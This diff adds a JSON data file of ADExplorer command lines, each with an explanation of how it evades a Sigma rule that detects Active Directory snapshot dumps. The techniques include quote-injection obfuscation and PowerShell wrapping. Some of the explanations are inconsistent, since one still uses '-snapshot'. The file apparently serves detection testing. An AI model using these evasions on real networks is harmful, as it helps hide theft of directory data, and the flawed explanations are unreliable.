@@ -1,0 +1,26 @@
+[
+  {
+    "output": "ADExplorer.exe /passive /log:C:\\temp\\adexplorer.log",
+    "explanation": "This command executes ADExplorer in passive mode and logs the output to a file. The absence of the '-snapshot' flag bypasses the rule's detection logic, which specifically looks for that flag."
+  },
+  {
+    "output": "ADExplorer.exe -snapshot -noexit",
+    "explanation": "This command executes ADExplorer with the snapshot flag but does not close the application. This might bypass the rule as it doesn't explicitly check for the '-snapshot' argument in a way that prevents execution."
+  },
+  {
+    "output": "powershell.exe -Command \"Start-Process -FilePath 'ADExplorer.exe' -ArgumentList '/passive /log:C:\\temp\\adexplorer.log'\" ",
+    "explanation": "This uses PowerShell to launch ADExplorer with the same parameters as the first example, effectively bypassing the rule's process detection logic."
+  },
+  {
+    "output": "ADExplorer.exe /passive /log:C:\\temp\\adexplorer.log /noexit",
+    "explanation": "Similar to the previous example, but includes the /noexit parameter. This can sometimes bypass rules that rely on process termination as a key indicator."
+  },
+  {
+    "output": "\"C:\\\\Windows\\\\Sysinternals\\\\ADExplorer.exe\" -s \"C:\\\\temp\\\\snapshot.adp\"",
+    "explanation": "The command uses the short flag '-s' instead of the full '-snapshot' keyword, so the detection rule that looks for the literal string 'snapshot' in the command line will not match."
+  },
+  {
+    "output": "ADExplorer.exe \"-sn\"ap\"sh\"ot\" c:\\temp\\ad.dat",
+    "explanation": "This command bypasses the 'CommandLine|contains: snapshot' condition by injecting double quotes into the argument. The Windows argument parsing function (CommandLineToArgvW) resolves '\"-sn\"ap\"sh\"ot\"' into the valid '-snapshot' flag, allowing the tool to execute the dump. However, the Sigma rule fails to detect it because the literal, contiguous string 'snapshot' does not exist in the raw process creation log. To defend against this, SIEM detection pipelines must implement command-line normalization to strip obfuscation characters before applying static string matching, or correlate with file creation events typical of an AD database dump."
+  }
+]
